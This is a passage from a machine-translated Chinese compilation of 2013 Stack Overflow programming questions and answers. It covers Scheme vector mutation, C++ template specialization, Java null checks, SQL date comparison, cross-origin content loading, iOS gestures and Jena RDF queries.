这个过程应该根据给定的过程替换 vec1 中的值。因此，如果过程是`+`，那么它将 vec1 中的每个值替换为每个元素的总和。例如：

```
~ (define v (vector 1 2 3 4 5 6))
~ (vector-join v + v)
~ v
#(2 4 6 8 10 12) 
```

我知道递归存在问题，但我不知道如何解决它。我只学会了如何使用 cons 进行递归，我认为这在这类问题中不是正确的做法。

到目前为止，这是我的代码：

```
(define v (vector 1 2 3 4 5 6))

(define (vector-join vec1 pre vec2)
  (define (help v1 proc v2 i)
    (if (null? v1) v1
        (if (null? v2) v1
            (if (>= i (vector-length v1)) v1 
                (cons (vector-set! v1 i (proc (vector-ref v1 i) (vector-ref v2 i)))
                      (help v1 proc v2 (add1 i)))))))  
  (help vec1 pre vec2 0)) 
```

当我输入这个：

```
(vector-join v + v) 
```

它返回这个：

```
(#<void> #<void> #<void> #<void> #<void> #<void> . #(2 4 6 8 10 12)) 
```

最后一部分是正确的答案，但我不知道为什么`#voids`会出现。有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:14:38.603

请注意，`cons`与`null?`此答案无关，这里我们不处理列表。此外，您正在修改作为参数接收的向量之一，这不是最好的主意，但让我们暂时忽略这个事实。像往常一样，我会给你解决方案的一般结构，这样你就可以计算出细节：

```
(define (vector-join vec1 pre vec2)
  (define (help v1 proc v2 i)
    (cond (<???> v1)            ; what's the exit condition?
          (else
           <???>                ; set the current value at position `i`
           <???>)))             ; advance the recursion, no consing here!
  (help vec1 pre vec2 0)) 
```

退出条件将是“何时`i`在向量之外”，在正常情况下，我们会`i`在移动到下一个位置之前更新向量中的当前位置（用 表示）。递归将在索引上进行；鉴于我们正在修改`v1`，这就是我们将在程序结束时返回的内容。它按预期工作：

```
(define v (vector 1 2 3 4 5 6))
(vector-join v + v)
=> '#(2 4 6 8 10 12) 
```

此过程的编写方式让人想起命令式语言中的解决方案。不寻常的部分（即对于 Scheme 程序）是这样一个事实，即在第二个中`<???>`你正在改变一个数据结构（在这种情况下是一个向量），但你这样做只是为了*效果*，而不是为了价值 -`vector-set!`操作不会'不返回有用的值，它解释`#<void>`了问题代码中显示的所有内容。

# c# - 在 ASP.net MVC 4 中自定义创建用户

> ID：15936265
> 
> 赞同：1
> 
> 时间：2013-04-10T20:57:43.283
> 
> 标签：c#, asp.net-mvc-4, asp.net-membership, membership-provider, custom-membershipprovider

我制作了一个 asp.net MVC 4 Internet 应用程序。我想要自定义创建用户功能。所以我使用`CreateUser`了类的功能`MembershipProvider`并`<providers>`在我的`web.config`.

但问题是当我运行代码时，它会捕获异常*Could not find stored procedure 'dbo.aspnet_CheckSchemaVersion'*。尽管数据库是由 asp.net 本身生成的，但它没有任何存储过程（与以前的版本一样）。

我不能使用 MVC 4 的`WebSecurity.CreateUserAndAccount`功能，因为它说它没有初始化。

所以我不知道该怎么办。任何帮助，将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:19:30.883

首先，请使用新的[ASP.NET Universal Providers](http://www.hanselman.com/blog/IntroducingSystemWebProvidersASPNETUniversalProvidersForSessionMembershipRolesAndUserProfileOnSQLCompactAndSQLAzure.aspx)。

`I wanted to have custom Create User function`

*   如果您想自己处理用户身份验证和身份验证，则需要实现[自定义成员资格提供程序](http://www.codeproject.com/Articles/165159/Custom-Membership-Providers)，它基本上会覆盖默认成员资格提供程序。

`exception Could not find stored procedure 'dbo.aspnet_CheckSchemaVersion'.`

*   您不会在新的 ASP.NET 通用提供程序中看到该异常，因为它不再使用`SchemaVersions`表。

# core-data - 从树控制器填充的大纲视图中显示的核心数据属性中获取值的总和

> ID：15936268
> 
> 赞同：0
> 
> 时间：2013-04-10T20:57:50.093
> 
> 标签：core-data, cocoa-bindings, nsoutlineview

我正在尝试了解有关为 OS X 创建应用程序的更多信息，但遇到了谷歌无法提供答案的问题。我正在创建的示例应用程序是一个 RSS 阅读器。我有文件夹和提要的核心数据实体，提要继承自文件夹。

Folder 的一个属性是 unreadCount，类型为 Integer64。Feed 从 Folder 继承此属性。这个想法是，将显示提要中未读文章的计数，​​并且将显示文件夹中包含的所有提要的未读文章总数。

我有一个管理实体文件夹的 NSTreeController。这个树形控制器使用文件夹/提要的标题以及每个提要和文件夹的未读计数填充大纲视图（现在文件夹默认为 0）。unreadCount 通过一个值转换器显示，该转换器采用整数计数并返回其字符串版本。所有这些都设置了绑定并且工作正常。

我遇到的问题是让文件夹的 unreadCount 成为其提要中所有未读计数的总和。我已经用谷歌搜索了几个小时，发现似乎是从数组控制器填充的表的解决方案`@sum.value`，但这显然不适用于树控制器（无论如何我都可以确定）。

所以，我的问题是，当显示是从树控制器填充的大纲视图时，如何让文件夹的显示 unreadCount 成为文件夹包含的 Feed 的 unreadCounts 的总和？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:08:32.183

我建议你重新考虑你的数据模型。不要使用`Feed`继承自`Folder`，而是使用通过关系连接的两个独立实体：一个`Folder`有许多`Feed`实例。

然后，您的计数可以由模型层提供：`@sum.self.feeds`. 这也使您能够编写自动化测试，并且当您需要特定文件夹中未读文章的数量时，这将简化您的生活。

# c++ - 模板化函数的重新声明错误

> ID：15936273
> 
> 赞同：3
> 
> 时间：2013-04-10T20:58:12.663
> 
> 标签：c++, templates

我有一个模板化函数继承另一个模板化函数的设置。

```
template <typename DataType>
class ClassBase
{ 
  virtual void InitModel(const cv::Mat& data) {};
}

template <typename DataType>
class ClassDerived : public ClassBase<DataType>
{
  void InitModel(const cv::Mat& data) {};
} 
```

现在我尝试在一个实现文件中为 ClassDerived 中的 InitModel 实现两个专业化和一个通用模板

```
template<>
void ClassDerived<float>::InitModel(const cv::Mat& data)
{
 // initialize some things
}

template<>
void ClassDervied<cv::Vec3b>::InitModel(const cv::Mat& data)
{
  // initialize some things
}

template<typename DataType>
void ClassDerived<DataType>::InitModel(const cv::Mat& data)
{
  // initialize some things
} 
```

在我写这篇文章之前，我没有任何专业，它工作得很好。一旦我添加了专业化，我就会收到一个错误，说有一个规范函数的重新声明。奇怪的部分是重新声明指向同一行号。在同一个文件中。由于它在专业化之前工作正常，我希望该文件不会被读取两次。

那么，为什么一旦添加专业化就会开始弹出这样的错误？

错误是：

> /other/workspace/perception/perception_kit/object_detection/include/perception_kit/object_detection/grimson_GMM_templated_impl.tpp:129: `perception_kit::GrimsonGMMGen::InitModel(cv::Mat const&)' CMakeFiles/test_obj.dir/src/ 的多重定义object_detection_templated_test_platform.cpp.o:/other/workspace/perception/perception_kit/object_detection/include/perception_kit/object_detection/grimson_GMM_templated_impl.tpp:129：首先在这里定义

问题是因为我试图派生模板类还是其他东西？

现在我明白，对于某些人来说，这可能是一个微不足道的问题，但我花了相当长的时间才将它发布到这里。

基类在 BaseClass.h（它作为抽象类实现） 派生类声明在 DerivedClass.h 派生类声明在 DerivedClass.tpp 并包含在 DerivedClass.h

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:08:18.683

您已经在标题中内联定义了基本模板代码（带有空正文），因此您以后无法再次重新定义它。我怀疑这是您的问题的根源，而不是专业化。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:20:36.707

您需要*声明*您具有这些类型的特化。否则，当不同翻译单元中的编译器实例化模板时，它将根据主模板为成员函数生成代码。当您尝试将这些生成的函数与您的特化链接时，链接器将看到特化的多个定义。

```
// Header
template <typename T>
struct test {
   void f() {}
};
template <>
void test<int>::f();       // Declare the specialization

// Implementation (cpp, not included by client code)
template <>
void test<int>::f() { ... } 
```

请注意，函数特化不再是模板，而是常规函数。如果不同的翻译单元包含函数的定义，那么它们将在多个翻译单元中生成代码。如果你想这样做，那么你可以跳过专业化的声明并直接提供定义，但你需要这样做`inline`：

```
// Implementation (if in header/included by user code)
template <>
inline void test<int>::f() { ... } 
```

# java - IndexOutOfBoundsException 问题

> ID：15936275
> 
> 赞同：0
> 
> 时间：2013-04-10T20:58:25.703
> 
> 标签：java, arraylist, indexoutofboundsexception

我希望有人可以帮助我解决`IndexOutOfBoundsException`错误。

我可以设置一个区域内的单位数量，我可以设置该区域的所有者，但是防御功能会导致问题。

痕迹：

```
Exception in thread "main" java.lang.IndexOutOfBoundsException: Index: 0, Size: 0
at java.util.ArrayList.RangeCheck(ArrayList.java:547)
at java.util.ArrayList.get(ArrayList.java:322)
at stackOverflow.Territory.calculateLoses(Territory.java:136)
at stackOverflow.Territory.defend(Territory.java:95)
at stackOverflow.Territory.defend(Territory.java:40)
at stackOverflow.Territory.main(Territory.java:155)

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public enum Territory {

// Europe
GREATBRITAIN("Great Britain"), ICELAND("Iceland");

private final String name;
private int numberOfUnits;
private Player player;
private int ad = 0, dd = 0;

private Territory(String name) {
    this.name = name;
    this.numberOfUnits = 0;
    this.player = null;
}

public void setOwner(Player p) {
    this.player = p;
}

public Player getOwner() {
    return this.player;
}

public int getNumberUnits() {
    return this.numberOfUnits;
}

public void setNumberUnits(int units) {
    this.numberOfUnits = units;
}

public boolean defend(Territory attacker) throws Exception {
    return defend(attacker, attacker.numberOfUnits - 1);
}

public boolean defend(Territory attacker, int attackingUnits)
        throws Exception {
    if (attackingUnits > (attacker.getNumberUnits() - 1)) {
        throw new Exception("Invalid number of units");
    }

    attacker.setNumberUnits(attacker.numberOfUnits - attackingUnits);
    Player defender = this.player;
    this.player = null;
    int defendingUnits = this.numberOfUnits;
    this.numberOfUnits = 0;

    if (this.numberOfUnits >= 3 && defendingUnits >= 2) {
        ad = 3;
        dd = 2;
    }
    if (this.numberOfUnits >= 3 && defendingUnits == 1) {
        ad = 3;
        dd = 1;
    }
    if (this.numberOfUnits == 2 && defendingUnits >= 2) {
        ad = 2;
        dd = 2;
    }
    if (this.numberOfUnits == 2 && defendingUnits == 1) {
        ad = 2;
        dd = 1;
    }
    if (this.numberOfUnits == 1 && defendingUnits >= 2) {
        ad = 1;
        dd = 2;
    }
    if (this.numberOfUnits == 1 && defendingUnits == 1) {
        ad = 1;
        dd = 1;
    }
    if (this.name == "Great Britan" || this.name == "Central America"
            || this.name == "Argentina" || this.name == "Egypt"
            || this.name == "Western Australia" || this.name == "India") {
        dd++;
    }

    List<Die> attackerDice = createDice(ad);
    List<Die> defenderDice = createDice(dd);
    System.out.printf("Attacker: %d \tDefender: %d\n", attackingUnits,
            defendingUnits);
    while (attackingUnits > 0 && defendingUnits > 0) {
        roll(attackerDice);
        System.out.println(attackerDice);
        roll(defenderDice);
        System.out.println(defenderDice);

        attackingUnits -= calculateLoses(attackerDice, defenderDice, false);
        defendingUnits -= calculateLoses(defenderDice, attackerDice, true);

        System.out.printf("Attacker: %d \tDefender: %d\n", attackingUnits,
                defendingUnits);
    }

    if (defendingUnits > 0) {
        this.player = defender;
        this.numberOfUnits = defendingUnits;
        return true;
    } else if (attackingUnits > 0) {
        this.numberOfUnits = attackingUnits;
        this.player = attacker.player;
        return false;
    } else {
        // No one owns the territory as all units died
        return false;
    }
}

private List<Die> createDice(int number) {
    List<Die> dice = new ArrayList<Die>();
    for (int i = 0; i < number; i++) {
        dice.add(new Die());
    }
    roll(dice);
    return dice;
}

private void roll(List<Die> dice) {
    for (Die d : dice) {
        d.roll();
    }
    Collections.sort(dice);
}

private int calculateLoses(List<Die> diceOne, List<Die> diceTwo,
        boolean defender) {
    int number = 0;
    for (int i = 0; i < 2; i++) {
        int comparison = diceOne.get(i).compareTo(diceTwo.get(i));
        if (comparison > 0 || (!defender && comparison == 0)) {
            number++;
        }
    }
    return number;
}

String units()
{
    return "" + numberOfUnits;
}

public static void main(String[] args) throws Exception
{
    Territory.GREATBRITAIN.setNumberUnits(5);
    System.out.println(Territory.GREATBRITAIN.getNumberUnits());
    Territory.ICELAND.setNumberUnits(5);
    System.out.println(Territory.ICELAND.getNumberUnits());
    Territory.GREATBRITAIN.defend(Territory.ICELAND);
}
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-10T21:01:11.477

看起来其中一个`ad`或`dd`两个都是 0。

鉴于此代码，这是有道理的：

```
this.numberOfUnits = 0;

// Lots of these, all requiring numberOfUnits to be greater than 0
if (this.numberOfUnits >= 3 && ...)
{
    ad = ...;
    dd = ...;
} 
```

`if`当您刚刚设置`numberOfUnits`为 0时，您如何期望进入任何这些块？

这只是您的代码中的问题*之一*。其他人指出了风格或正确性的其他方面。我不打算在这里修复你*所有*的代码——但你应该分析一下你自己是如何诊断出来的。例如，您是否尝试过在调试器中单步执行代码？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:04:33.337

这段代码是错误的：

```
if (this.name == "Great Britan" || this.name == "Central America"
        || this.name == "Argentina" || this.name == "Egypt"
        || this.name == "Western Australia" || this.name == "India") {
    dd++;
} 
```

用于`this.name.equals("Great Britain")`测试字符串是否包含相同的字符，而不是它们是否存储在内存中的相同位置。

此外，您的许多单独的`if`陈述看起来像是不好的做法；使用`else`或其他东西来检查您至少击中了一个案例 - 设置后您显然没有击中任何一个`this.numberOfUnits >= [stuff]`案例`this.numberOfUnits = 0;`。

# ember.js - 将模型增量添加到控制器

> ID：15936276
> 
> 赞同：1
> 
> 时间：2013-04-10T20:58:34.693
> 
> 标签：ember.js

我有一个标准的问题路线，例如：

```
App.MessagesRoute = Ember.Route.extend({

    model: function() {
        return App.Message.find();
    }

}); 
```

这对于我从 REST 端点获得的现有消息集非常有用。但我也通过 websocket 收到新消息。在 RC2 路由架构（和非 Ember 数据存储）中，我如何将这样的新消息干净地插入 Ember？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T22:37:29.283

[我使用在How to fire an event to Ember from another framework](https://stackoverflow.com/questions/14458287/how-to-fire-an-event-to-ember-from-another-framework/14508316#14508316)中讨论过的 Ember.Instrumentation 框架元素解决了这个问题。

这是我的完整代码：

```
...
// this is fired from my websocket message reception code.

Ember.Instrumentation.instrument('onMessage', message);
...

App.MessagesRoute = Ember.Route.extend({

    setupController: function(controller, model) {
        Ember.Instrumentation.subscribe('onMessage', {
            before: function(name, timestamp, message) {
                controller.send('onMessage', message);
            },
            after: function() {}
        });
    },

    model: function() {
        return App.Message.find();
    }

});

App.MessagesController = Ember.ArrayController.extend({
    onMessage: function(message) {
        this.unshiftObject(message);
    }
}); 
```

# intuit-partner-platform - 尝试使用 v2 API Explorer for Intuit IPP for QBD 时获取 OAuth 令牌被拒绝

> ID：15936278
> 
> 赞同：0
> 
> 时间：2013-04-10T20:58:40.553
> 
> 标签：intuit-partner-platform

我登录了 API 资源管理器并在此处授权了我的虚拟公司文件：http: [//idsapiexplorer.cloudapp.net/V2QBD#api](http://idsapiexplorer.cloudapp.net/V2QBD#api)

它表明一切正常：

![在此处输入图像描述](https://i.stack.imgur.com/pgcp3.png)

当我尝试提出请求时，我不断收到以下响应： ![在此处输入图像描述](https://i.stack.imgur.com/CgMC7.png)

这是`ErrorDesc`：

```
<ErrorDesc>message=Exception authenticating OAuth; errorCode=003200; statusCode=401; source=OAuthStrategy; oauth_problem=token_rejected; cause=net.oauth.OAuthProblemException: token_rejected</ErrorDesc> 
```

我猜我可能没有正确使用它。还有更多我可以阅读的文档来学习吗？或者是否存在导致此错误的实际问题？任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T11:41:58.233

该错误表示令牌未找到、已过期或无效。我会尝试刷新您的访问令牌，您应该已经准备就绪。

谢谢贾里德
_

# sql - SQL 比较 INT 和 GETDATE

> ID：15936280
> 
> 赞同：1
> 
> 时间：2013-04-10T20:58:47.980
> 
> 标签：sql, sql-server, sql-server-2008, date

我很难弄清楚这一点，并在这里尝试了一切。我知道这很简单...

我们的日期以 int 形式存储在表中。EX 20130409。如何让 SQL 返回小于今天日期的日期？

我一直在使用 cast 和 convert 的不同组合，但不断出现溢出错误或转换失败。

这是一些最近的代码：

```
SELECT
DBO.SPSYS07.LOC_CODE,
CONVERT(DATETIME,CAST(DBO.SPSYS07.REQ_D_DATE AS CHAR(8)),101) AS [CONVERTED_REQ_DATE],
DBO.SPSYS07.REQ_D_DATE
FROM  DBO.SPSYS07
WHERE SPSYS07.SHIP_DATE <= convert(int,convert(varchar(8),getdate(),112)) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:02:00.820

尝试声明今天的日期并使用它

```
Declare todaysDate date
Set todaysDate = getdate() 
```

然后将todaysDate转换为字符串，然后去掉年月日之间的'-'，然后....

```
Select..... Where shipdate <= todaysDate 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:14:00.913

您只需将“20130101”更改为您的 int 值。

```
DECLARE @date date
SELECT  @date = CONVERT(date, CAST('20130101' AS CHAR(12)), 112)
SELECT * FROM yourTable where @date < getdate() 
```

问候

# mysql - mysql集群.net连接器

> ID：15936282
> 
> 赞同：0
> 
> 时间：2013-04-10T20:58:49.840
> 
> 标签：mysql, .net, database-connection, cluster-computing, failover

我正在尝试将 mysql 集群用于我们客户的项目中。

我设置的配置如下： 硬件SO设备

```
Server1 - S.O. Windows 2008 R2 64bit 
Server2 - S.O. Windows 2008 R2 64bit 
Client1 - S.O. Windows 7 64bit 
Client2 - S.O. Windows 7 64bit 

UserClient2 - S.O. Windows 7 64bit 
UserClient3 - S.O. Windows 7 64bit 
UserClient4 - S.O. Windows 7 64bit 
UserClient5 - S.O. Windows 7 64bit 
UserClientXX - S.O. Windows 7 64bit (where XX is less than 15) 
```

My Sql Cluster Configuration Server1 - 作为集群数据节点 1 Server2 - 作为集群数据节点 2 Server1 - 作为 mysql 节点 1（从现在 MYSQL-D1） Server2 - 作为 mysql 节点 2（从现在 MYSQL-D2）

```
Client1 - act as mysql cluster management node 1 
Client2 - act as mysql cluster management node 2 
```

客户端应用程序配置 以下客户端（从现在开始为 CLIENTAPP）：Client1、Client2、UserClient2、..、UserClientXX 具有与 mysql 集群数据库交互的 Microsoft .Net 应用程序。

一段时间后，My sql 集群配置似乎可以正常工作，并且任何 CLIENTAPP 都能够连接到 MYSQL-D1 或 MYSQL-D2（这可以通过更改 .NET 客户端应用程序的连接字符串并指向 MYSQL-D1 的 IP或MYSQL-D2的IP）。

在一个完美的世界中，CLIENTAPP 能够自动连接到正确的服务器（MYSQL-D1 或 MYSQL-D2），实际上： - 如果 MYSQL-D1 关闭 CLIENTAPP 连接到 MYSQL-D2 - 如果 MYSQL-D2 关闭 CLIENTAPP 连接到 MYSQL -D1

.NET 客户端应用程序如何与 mysql 集群交互？

我为我的场景找到的最佳解决方案如下： 1\. 使用 mysql 代理，但这处于 alpha 阶段，我无法在生产环境中使用它 2\. 在每个 CLIENTAPP 上安装集群数据节点 3\. 使用连接字符串支持多台服务器（我不知道 mysql .NET 连接器是否支持） 4\. 重写我的应用程序以与两个 MYSQL-DX 节点交互（我想避免的）

有正确的解决方案吗？哪一个是最好的？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T14:17:21.693

这是在 MySQL 集群论坛上回答的：http: [//forums.mysql.com/read.php?25,583508,584009](http://forums.mysql.com/read.php?25,583508,584009)

# java - 在 Java 中验证空值的 BigDecimal 数据类型

> ID：15936286
> 
> 赞同：4
> 
> 时间：2013-04-10T20:59:10.373
> 
> 标签：java, validation, bigdecimal

我正在尝试验证 java 中数据类型 BigDecimal 的 NULL。我能够验证 0 值，但是 NULL 会导致**NULL Point Exception**。我是否应该在异常中处理此数据类型的验证，或者是否可以对数据进行一些计算以对其进行验证。下面是我到目前为止所做的一个例子：

```
 if(crime.getCrimeLatLocation() != null  & crime.getCrimeLongLocation() != null || crime.getCrimeLatLocation().compareTo(BigDecimal.ZERO) != 0 & crime.getCrimeLongLocation().compareTo(BigDecimal.ZERO) != 0){

     logger.info('Valid Data');
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:03:28.817

你`||`应该是`&&`- 发生的事情是，当你传入一个空值时，它在前两个条件下评估为 false，但随后它会继续处理第三个和第四个条件并导致异常。如果将 更改`||`为`&&`then 短路评估将阻止评估第三和第四个条件。

一定要使用 a`&&`而不是 a `&`- 前者使用短路评估，但后者会强制评估第三和第四个条件，您将再次获得空指针异常。 `condition1 && condition2`说“如果条件 1 为假，则返回假，否则评估条件 2” - 如果条件 1 为假，则永远不会评估条件 2。相反，`condition1 & condition2`将始终评估这两个条件。使用的唯一原因`&`是条件是否有副作用。同样，`condition1 || condition2`如果 condition1 为真，则不会评估 condition2，但`|`将始终评估这两个条件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:06:53.783

你的测试在这里

```
if(crime.getCrimeLatLocation() != null  & crime.getCrimeLongLocation() != null 
|| crime.getCrimeLatLocation().compareTo(BigDecimal.ZERO) != 0 & crime.getCrimeLongLocation().compareTo(BigDecimal.ZERO) != 0) 
```

使用二进制而不是布尔运算符，将其更改为

```
if((crime.getCrimeLatLocation() != null  && crime.getCrimeLatLocation().compareTo(BigDecimal.ZERO) != 0) 
|| (crime.getCrimeLongLocation() != null && crime.getCrimeLongLocation().compareTo(BigDecimal.ZERO) != 0)) 
```

这表示要么`crimeLatLocation`is not`null`且不为零，要么 is `crimeLongLocation`not`null`且 not `zero`。

当你使用`&`then 表达式的两边都会被评估，当你使用`&&`then 时，如果表达式的第一部分是 ，则测试是短路的`false`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-08-21T13:58:13.587

您需要在比较之前检查空值。您可以使用此功能进行比较。

```
/** This method compares 2 BigDecimal objects for equality. It takes care of null object and that was the necessity of having it.
 * To use this function most efficiently pass the possibly null object before the not null object.
 * @param pNumber1
 * @param pNumber2
 * @return boolean
 */
public static boolean isEqual(BigDecimal pNumber1, BigDecimal pNumber2)
{
    if ( pNumber1 == null )
    {
        if ( pNumber2 == null)
            return true;
        return false;
    }
    if ( pNumber2 == null)
        return false;
    return pNumber1.compareTo(pNumber2)==0;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-09-13T17:06:39.587

如果您的主要目标是验证 BigDecimal 数据类型是否为空值，那么只需进行比较；

```
yourBigDecimal != null. 
```

上面的语句足以进行比较和检查。

# jquery - 如何使用 JavaScript/jQuery 将其他网站的内容加载到我的网站上？

> ID：15936288
> 
> 赞同：1
> 
> 时间：2013-04-10T20:59:19.237
> 
> 标签：jquery, xml, ajax, json, wikipedia

我正在尝试将维基百科文章加载到我的网站上。我正在尝试按照此处的说明进行操作：[http](http://en.wikipedia.org/wiki/Wikipedia:WikiProject_Transwiki) ://en.wikipedia.org/wiki/Wikipedia:WikiProject_Transwiki但我不知所措。

我试过了：

```
var xyz = document.getElementById(url("http://en.wikipedia.org/w/index.php?title=Special:Export&history=1&action=submit&pages=Albert_einstein")

var xyz = $('#xyz').load('http://en.wikipedia.org/w/index.php?title=Special:Export&history=1&action=submit&pages=Albert_einstein');

document.write(xyz); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:06:02.800

您无法通过 JavaScript 从与您自己的域不同的域加载内容。JS[安全策略](http://en.wikipedia.org/wiki/Same_origin_policy)阻止它。

> “在计算领域，同源策略是许多浏览器端编程语言（例如 JavaScript）的重要安全概念。该策略允许脚本在源自同一站点的页面上运行——方案、主机名和端口号的组合^([ [1](http://www.w3.org/Security/wiki/Same_Origin_Policy)) – 访问彼此的方法和属性，没有特定限制，但阻止在不同站点上跨页面访问大多数方法和属性。^([1]) ”

-- 维基百科，来自 W3C

Shazbot 建议使用 iframe，但不推荐使用 iframe。使用对象：

```
<div class="timeContainer" style="background:#333; color:#090; padding:10px 0;">
  <div style="text-align:center; width:100%;">Current Date and Time</div> <!-- Heading, replaceable with hx tag -->

<!--[if IE]>
 <object classid="clsid:25336920-03F9-11CF-8FD0-00AA00686F13" data="your.url/" style="width:100%; height:19px;">
  <p>backup content</p>
 </object>
<![endif]-->

<!--[if !IE]> <-->
 <object type="text/html" data="your.url/" style="width:100%; height:19px;">
  <p>backup content</p>
 </object>
<!--> <![endif]-->
</div> <!-- timeContainer --> 
```

或者，您可以通过 PHP 使用 cURL（如果您的服务器支持它）。我不确定 Python，但我认为 Python 也可以使用 cURL。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:30:41.653

如果您使用的是现代浏览器，则应该能够使用 CORS。根据 Wikipedia API 文档，您需要传递与浏览器发送的标头`origin`匹配的附加参数。`Origin`

[http://en.wikipedia.org/w/api.php](http://en.wikipedia.org/w/api.php)

> "origin - 当使用跨域 AJAX 请求 (CORS) 访问 API 时，将其设置为原始域。这必须与 Origin: 标头中的一个来源完全匹配，因此必须将其设置为类似 [http： //en.wikipedia.org](http://en.wikipedia.org)或[https://meta.wikimedia.org](https://meta.wikimedia.org)。如果此参数与 Origin: 标头不匹配，将返回 403 响应。如果此参数与 Origin: 标头匹配并且源被列入白名单，将设置 Access-Control-Allow-Origin 标头。”

# ios - 在占位符 UIView 上使用手势识别器平移 UIImage

> ID：15936289
> 
> 赞同：0
> 
> 时间：2013-04-10T20:59:23.313
> 
> 标签：ios, uigesturerecognizer, uipangesturerecognizer

我需要裁剪图像以匹配特定尺寸。从底部开始，我的视图中有三层：

1.  我有原始图像在`UIImage`. 此图像来自相机。（称为cameraImage）
2.  我有一个`UIView`拿着这个图像。当用户单击“裁剪”时，UIView 的边界用于裁剪其中的原始图像。
3.  最重要的是，我有一个指导图像，它向用户展示了他们需要平移、旋转和捏合图像以适应的尺寸。

我想将平移手势添加到顶部指南图像并让它控制底部的原始图像。所以引导图像永远不会移动，但它正在监听平移手势。如果不让我的原始图像跳回零，我无法弄清楚如何重置识别器。也许有人可以帮忙？

```
- (IBAction)handlePan:(UIPanGestureRecognizer *)recognizer {
CGPoint translation = [recognizer translationInView:recognizer.view];
recognizer.view.center = CGPointMake(recognizer.view.center.x+translation.x, recognizer.view.center.y+ translation.y);
[recognizer setTranslation:CGPointMake(0, 0) inView:recognizer.view];
} 
```

上面的代码在我的手势中效果很好，附在底部图像上。问题是当用户超出视图范围时，图像停止平移并且基本上卡住了。你不能再碰它，所以它就坐在那里。所以我想如果我将手势附加到顶部它会解决这个问题。

```
- (IBAction)handlePan:(UIPanGestureRecognizer *)recognizer {
CGPoint translation = [recognizer translationInView:recognizer.view];
cameraImage.center = CGPointMake(recognizer.view.center.x+translation.x, recognizer.view.center.y+ translation.y);
} 
```

这几乎可以工作。我设置了 cameraImage 的中心并删除了重置识别器的第三行。如果我不删除它，每次我尝试平移时，cameraImage 都会跳回相同的位置。它几乎可以工作，因为当您再次单击图像时，它不会从您触摸的像素开始。它将图像移回原始位置，然后让您平移。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:15:01.817

第一种选择：当识别器进入`UIGestureRecognizerStateEnded`状态时

```
if(recofnizer.state == UIGestureRecognizerStateEnded )
{
...
} 
```

您将当时的翻译存储在类的实例变量 (@property) 中。

然后您总是将保存的翻译添加到新翻译中。在代码中，这看起来像这样：

```
 - (IBAction)handlePan:(UIPanGestureRecognizer *)recognizer {
       CGPoint translation = [recognizer translationInView:recognizer.view];
       CGPoint updatedTranslation = CGPointMake(translation.x+self.savedTranslation.x,translation.y+self.savedTranslation.y);
       cameraImage.center = CGPointMake(recognizer.view.center.x+updatedTranslation.x, recognizer.view.center.y+ updatedTranslation.y);
       if(recofnizer.state == UIGestureRecognizerStateEnded )
       {
          self.savedTranslation = updatedTranslation;
       }
} 
```

不要忘记添加`@property (nonatomic, assign) CGPoint savedTranslation;`到您的界面。还要确保在您的类的 init 方法中初始化 savedTranslation 变量以`self.savedTranslation = CGPointMake(0,0);`

第二种选择：您应该考虑在滚动视图中使用 imageview 作为滚动视图的 viewForZooming 来做所有您想做的事情。这允许非常流畅的交互，就像用户习惯的那样！

然后，您可以在此滚动视图上方放置您的遮罩/指南，但请确保禁用遮罩/指南视图的 userInteraction 以使您的用户触摸下面的滚动视图！

# rdf - 如何列出 rdf 语句的对象？

> ID：15936291
> 
> 赞同：2
> 
> 时间：2013-04-10T20:59:29.783
> 
> 标签：rdf, jena, ontology

我想通过任何 RDF 谓词选择与给定主题资源相关的资源列表。

例如，如果我的模型中的资源是`ex:alice`、和`ex:bob`，并且我的模型包含：`ex:peter``ex:Ben`

```
ex:alice ex:meet ex:bob.  
ex:alice foaf:knows ex:Peter.  
ex:alice ex:talk :ben. 
```

我将如何编写一个方法来返回资源列表，这些资源列表是给定特定资源作为主题的任何三元组的对象？例如，如果我给：

```
resourcesRelatedToResource( alice ); 
```

我希望有一个包含 Bob、Peter 和 Ben 的列表。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T13:28:31.027

使用 Jena API，如果您`listStatements`使用将充当通配符的主语、宾语或谓词的空参数进行调用。因此，您只想传递主题 Alice，并收集匹配三元组的对象（如果它们是对象）。Jena 有一个捷径：给定一个资源`r`，调用：

```
r.listProperties() 
```

相当于：

```
r.getModel().listStatements( r, null, (RDFNode) null ) 
```

所以：

```
public void test() {
    Model m = /*... your model here ...*/;

    // get a reference to the Alice resource
    Resource alice = m.getResource( NS + "alice" );

    Set<Resource> result = resourcesRelatedToResource( alice );
}

/** Return a set of the resources related to the given input 
  * resource via any predicate */
protected Set<Resource> resourcesRelatedToResource( Resource r ) {
    // we don't care about duplicates, so use a Set
    Set<Resource> objs = new HashSet<Resource>();

    // iterate over the triples with alice as subject
    for (StmtIterator i = r.listProperties(); i.hasNext(); ) {
        RDFNode obj = i.nextStatement().getObject();

        if (obj.isResource()) {
            objs.add( obj.asResource() );
        }
    }

    return objs;
} 
```

# apache - 配置 Apache 以将请求转发到主机上的自定义（非 HTTP）进程

> ID：15936292
> 
> 赞同：0
> 
> 时间：2013-04-10T20:59:28.407
> 
> 标签：apache

